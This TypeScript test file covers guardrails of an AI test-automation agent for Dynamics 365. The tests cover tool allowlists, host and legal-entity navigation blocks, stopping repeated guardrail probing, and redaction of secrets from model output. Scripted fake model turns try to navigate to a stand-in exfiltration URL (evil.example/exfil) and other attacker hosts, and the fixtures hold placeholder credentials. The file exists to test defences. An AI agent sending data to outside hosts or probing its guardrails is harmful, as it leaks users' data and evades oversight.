import assert from 'node:assert/strict';
import { mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it } from 'node:test';
import { AgentOrchestrator } from './orchestrator.js';
import { redactSecrets } from '../d365fo/login.js';
import type { AppConfig } from '../config/index.js';
import type { LlmCompleteRequest, LlmCompleteResponse, LlmMessage } from '../llm/types.js';
import type { TestCase } from '../testing/types.js';

const BASE = 'https://x.sandbox.operations.dynamics.com';
const PASS = 'S3cr3t-Pa55!';
const API_KEY = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz';

const tc: TestCase = {
  id: 'T1', source: 'local', title: 'guarded', module: 'AP', steps: [{ index: 1, action: 'Open' }, { index: 2, action: 'Check' }],
};

const call = (name: string, args: Record<string, unknown>, id = name): LlmCompleteResponse => ({
  text: '', stopReason: 'tool_use', toolCalls: [{ id, name, arguments: args }],
});
const finish = (args: Record<string, unknown> = { outcome: 'passed' }) => call('finish_test', args, 'fin');

interface Harness {
  reached: Array<[string, string, Record<string, unknown>]>;
  upserts: Array<Record<string, unknown>>;
  requests: LlmCompleteRequest[];
  run: (t?: TestCase) => ReturnType<AgentOrchestrator['runTestCase']>;
}

function harness(
  turns: LlmCompleteResponse[],
  over: Partial<AppConfig> = {},
  discovered: Array<{ server: string; name: string }> = [],
  page = 'page',
): Harness {
  const h: Harness = { reached: [], upserts: [], requests: [], run: async () => { throw new Error('unset'); } };
  const cfg = {
    LLM_PROVIDER: 'anthropic', AGENT_DRY_RUN: false, AGENT_VERBOSE: false, AGENT_MAX_STEPS: 40,
    AGENT_RELOOP_MAX_RETRIES: 0, AGENT_RELOOP_RETRY_ON: [], AGENT_RELOOP_COOLDOWN_MS: 0,
    D365_BASE_URL: BASE, D365_COMPANY: 'USMF', D365_PASSWORD: PASS, ANTHROPIC_API_KEY: API_KEY,
    ...over,
  } as AppConfig;
  const llm = {
    name: 'fake',
    async complete(req: LlmCompleteRequest) {
      h.requests.push({ ...req, messages: req.messages.map((m: LlmMessage) => ({ ...m })) });
      return turns.shift() ?? finish({ outcome: 'blocked' });
    },
  };
  const mcp = {
    async listTools() { return discovered.map((d) => ({ ...d, description: '', inputSchema: { type: 'object' } })); },
    async callTool(server: string, tool: string, args: Record<string, unknown>) { h.reached.push([server, tool, args]); return { content: page, isError: false }; },
  };
  const kb = { retrieve: () => [], upsert(e: Record<string, unknown>) { h.upserts.push(e); }, async save() {} };
  const dir = mkdtemp(join(tmpdir(), 'orch-'));
  h.run = async (t = tc) => {
    cfg.REPORT_DIR = await dir;
    return new AgentOrchestrator({ cfg, llm, mcp, kb, mcpServers: ['playwright', 'learn'] } as never).runTestCase(t);
  };
  return h;
}

const toolResults = (h: Harness) => h.requests.at(-1)!.messages.filter((m) => m.role === 'tool').map((m) => m.content);

describe('tool allowlist enforcement', () => {
  it('hides tools that are not allowlisted from the model', async () => {
    const h = harness([finish()], {}, [
      { server: 'playwright', name: 'browser_snapshot' },
      { server: 'playwright', name: 'browser_storage_state' },
      { server: 'playwright', name: 'browser_evaluate' },
      { server: 'learn', name: 'microsoft_docs_search' },
    ]);
    await h.run();
    const names = (h.requests[0].tools ?? []).map((t) => t.name);
    assert.ok(names.includes('playwright__browser_snapshot') && names.includes('learn__microsoft_docs_search'));
    assert.ok(!names.includes('playwright__browser_storage_state') && !names.includes('playwright__browser_evaluate'));
    assert.ok(names.includes('report_step') && names.includes('finish_test'));
  });

  it('refuses a hallucinated call to a hidden tool without reaching the MCP server, and reports it', async () => {
    const h = harness([call('playwright__browser_storage_state', {}), finish()]);
    const res = await h.run();
    assert.deepEqual(h.reached, []);
    assert.match(toolResults(h)[0], /Blocked by policy.*allowlist/);
    assert.equal(res.outcome, 'passed');
    assert.equal(res.policyBlocks?.length, 1);
    assert.match(res.policyBlocks![0], /playwright__browser_storage_state/);
  });

  it('lets an operator opt a tool in', async () => {
    const h = harness([call('playwright__browser_file_upload', { paths: ['/tmp/a.csv'] }), finish()], { AGENT_ALLOWED_TOOLS_EXTRA: ['playwright__browser_file_upload'] });
    const res = await h.run();
    assert.deepEqual(h.reached.map((r) => r[1]), ['browser_file_upload']);
    assert.equal(res.policyBlocks, undefined);
  });

  it('refuses servers that were not enabled', async () => {
    const h = harness([call('azure-devops__wit_get_work_item', {}), finish()]);
    await h.run();
    assert.deepEqual(h.reached, []);
    assert.match(toolResults(h)[0], /not enabled/);
  });
});

describe('navigation and legal-entity guard', () => {
  it('allows the F&O host and blocks anything else', async () => {
    const h = harness([
      call('playwright__browser_navigate', { url: `${BASE}/?mi=x` }, 'a'),
      call('playwright__browser_navigate', { url: 'https://evil.example/exfil?d=1' }, 'b'),
      finish(),
    ]);
    const res = await h.run();
    assert.deepEqual(h.reached.map((r) => r[2].url), [`${BASE}/?mi=x`]);
    assert.match(toolResults(h)[1], /Blocked by policy.*evil\.example/);
    assert.equal(res.policyBlocks?.length, 1);
  });

  it('blocks company links outside the legal entity, honouring a per-test entity', async () => {
    const url = `${BASE}/?cmp=DEMF`;
    const h = harness([call('playwright__browser_navigate', { url }), finish()]);
    await h.run();
    assert.deepEqual(h.reached, []);
    assert.match(toolResults(h)[0], /DEMF.*USMF/);

    const h2 = harness([call('playwright__browser_navigate', { url }), finish()]);
    await h2.run({ ...tc, legalEntity: 'DEMF' });
    assert.equal(h2.reached.length, 1);
  });

  it('stops an attempt that keeps probing the guardrails', async () => {
    const turns = Array.from({ length: 12 }, (_, i) => call('playwright__browser_navigate', { url: `https://evil${i}.example/` }, `n${i}`));
    const h = harness(turns);
    const res = await h.run();
    assert.equal(res.outcome, 'blocked');
    assert.match(res.errorMessage ?? '', /5 tool calls were refused by the guardrails/);
    assert.equal(h.reached.length, 0);
    assert.equal(h.requests.length, 5);
  });
});

describe('policy stop', () => {
  it('does not run the rest of a response once the attempt is stopped', async () => {
    const evil = (i: number) => ({ id: `e${i}`, name: 'playwright__browser_navigate', arguments: { url: `https://evil${i}.example/` } });
    const burst: LlmCompleteResponse = {
      text: '', stopReason: 'tool_use',
      toolCalls: [...[1, 2, 3, 4, 5].map(evil), { id: 'ok', name: 'playwright__browser_navigate', arguments: { url: BASE } }],
    };
    const h = harness([burst]);
    const res = await h.run();
    assert.equal(res.outcome, 'blocked');
    assert.deepEqual(h.reached, [], 'the sixth, permitted call never ran');
  });
});

describe('model-written text is scrubbed and bounded before it is stored', () => {
  it('redacts configured secrets and token-shaped strings in steps, verdicts and learnings', async () => {
    const jwt = 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJlMTIzNDU2';
    const h = harness([
      call('report_step', { index: 1, status: 'failed', observed: `page showed password ${PASS} and ${jwt}`, errorMessage: `key ${API_KEY}` }),
      finish({
        outcome: 'failed', summary: `Bearer ${'a'.repeat(30)} leaked`, errorMessage: `bad ${PASS}`,
        learnings: [{ kind: 'selector', summary: `use ${PASS}`, details: `token ${jwt}` }],
      }),
    ]);
    const res = await h.run();
    const stored = JSON.stringify({ res, upserts: h.upserts });
    for (const secret of [PASS, API_KEY, jwt, 'a'.repeat(30)]) assert.ok(!stored.includes(secret), `leaked ${secret}`);
    assert.match(res.steps[0].observed ?? '', /password \*\*\* and \*\*\*/);
  });

  it('truncates oversized text and caps learnings', async () => {
    const learnings = Array.from({ length: 25 }, (_, i) => ({ kind: 'recipe', summary: `s${i}`, details: 'd'.repeat(5000) }));
    const h = harness([call('report_step', { index: 1, status: 'passed', observed: 'o'.repeat(10_000) }), finish({ outcome: 'passed', learnings })]);
    const res = await h.run();
    assert.ok((res.steps[0].observed ?? '').length < 2100);
    assert.equal(h.upserts.length, 10);
    assert.ok(String(h.upserts[0].details).length < 2100);
  });

  it('drops learnings with an unknown kind or missing fields', async () => {
    const h = harness([finish({ outcome: 'passed', learnings: [
      { kind: 'exploit', summary: 'x', details: 'y' }, { kind: 'doc', summary: 'ok', details: 'fine' }, { kind: 'doc', summary: '   ', details: 'y' }, null, { kind: 'doc' },
    ] })]);
    await h.run();
    assert.deepEqual(h.upserts.map((u) => u.summary), ['ok']);
  });
});

describe('tool argument validation', () => {
  it('rejects a bad step index or status without recording anything', async () => {
    const h = harness([
      call('report_step', { index: 99, status: 'passed' }, 'a'),
      call('report_step', { index: 1, status: 'great' }, 'b'),
      call('report_step', { status: 'passed' }, 'c'),
      finish(),
    ]);
    const res = await h.run();
    assert.equal(res.steps.length, 0);
    const results = toolResults(h);
    assert.match(results[0], /Invalid step index 99.*1, 2/);
    assert.match(results[1], /Invalid status \\"great\\"/);
    assert.match(results[2], /Invalid step index undefined/);
  });

  it('accepts a numeric-string index and lets a later report replace an earlier one', async () => {
    const h = harness([
      call('report_step', { index: '1', status: 'failed', observed: 'first' }, 'a'),
      call('report_step', { index: 1, status: 'passed', observed: 'second' }, 'b'),
      call('report_step', { index: 2, status: 'passed' }, 'c'),
      finish(),
    ]);
    const res = await h.run();
    assert.deepEqual(res.steps.map((s) => [s.index, s.status, s.observed]), [[1, 'passed', 'second'], [2, 'passed', undefined]]);
  });

  it('keeps the test open when finish_test has an invalid outcome', async () => {
    const h = harness([call('finish_test', { outcome: 'maybe' }, 'a'), finish({ outcome: 'failed', errorMessage: 'real' })]);
    const res = await h.run();
    assert.match(toolResults(h)[0], /Invalid outcome \\"maybe\\".*still open/);
    assert.equal(res.outcome, 'failed');
    assert.equal(res.errorMessage, 'real');
  });

  it('survives non-object tool arguments', async () => {
    const h = harness([{ text: '', stopReason: 'tool_use', toolCalls: [{ id: 'x', name: 'report_step', arguments: null as never }] }, finish()]);
    const res = await h.run();
    assert.equal(res.outcome, 'passed');
    assert.match(toolResults(h)[0], /Invalid step index/);
  });
});

describe('context compaction in the run loop', () => {
  const page = `### Page state\n${'- button "Save" [ref=e5]\n'.repeat(80)}`;
  const stubbed = (m: LlmMessage) => m.content.startsWith('[Omitted older tool result');
  const snapshots = (n: number) => [...Array.from({ length: n }, (_, i) => call('playwright__browser_snapshot', { n: i }, `s${i}`)), finish()];

  it('collapses old snapshots but keeps the latest ones and the pairing intact', async () => {
    const h = harness(snapshots(12), { AGENT_MAX_REPEATED_CALLS: 0, AGENT_CONTEXT_KEEP_RECENT: 3 }, [], page);
    const res = await h.run();
    assert.equal(res.outcome, 'passed');
    const last = h.requests.at(-1)!.messages.filter((m) => m.role === 'tool');
    assert.equal(last.length, 12);
    assert.ok(stubbed(last[0]) && stubbed(last[7]), 'oldest results are collapsed');
    assert.deepEqual(last.slice(-3).map(stubbed), [false, false, false], 'latest three are verbatim');
    assert.ok(last.filter((m) => !stubbed(m)).length <= 6);
    assert.deepEqual(last.map((m) => m.toolCallId), Array.from({ length: 12 }, (_, i) => `s${i}`));
  });

  it('sends far fewer characters than the uncompacted history would', async () => {
    const size = (h: Harness) => h.requests.reduce((sum, r) => sum + r.messages.reduce((n, m) => n + m.content.length, 0), 0);
    const off = harness(snapshots(30), { AGENT_MAX_REPEATED_CALLS: 0, AGENT_CONTEXT_KEEP_RECENT: 0 }, [], page);
    const on = harness(snapshots(30), { AGENT_MAX_REPEATED_CALLS: 0, AGENT_CONTEXT_KEEP_RECENT: 3 }, [], page);
    await off.run();
    await on.run();
    assert.ok(size(on) < size(off) / 2, `compacted ${size(on)} vs ${size(off)}`);
    assert.ok(!off.requests.at(-1)!.messages.some(stubbed), 'AGENT_CONTEXT_KEEP_RECENT=0 disables it');
  });

  it('does not change short conversations', async () => {
    const h = harness(snapshots(4), { AGENT_MAX_REPEATED_CALLS: 0 }, [], page);
    await h.run();
    assert.ok(!h.requests.at(-1)!.messages.some(stubbed));
  });
});

describe('redactSecrets', () => {
  it('scrubs every configured secret, not just the D365 login', () => {
    const cfg = { D365_PASSWORD: PASS, ANTHROPIC_API_KEY: API_KEY, AZDO_PAT: 'pat-value-123', GITHUB_COPILOT_TOKEN: 'gho_' + 'x'.repeat(36) };
    const out = redactSecrets(cfg, `a ${PASS} b ${API_KEY} c pat-value-123 d ${cfg.GITHUB_COPILOT_TOKEN}`);
    assert.equal(out, 'a *** b *** c *** d ***');
  });

  it('scrubs token shapes that are not configured, and leaves ordinary text alone', () => {
    const cfg = {};
    assert.equal(redactSecrets(cfg, 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345'), 'Authorization: ***');
    assert.equal(redactSecrets(cfg, 'ghp_' + 'A'.repeat(36)), '***');
    assert.equal(redactSecrets(cfg, 'The vendor account was created and posted.'), 'The vendor account was created and posted.');
    assert.equal(redactSecrets(cfg, 'Password field is required'), 'Password field is required');
  });
});
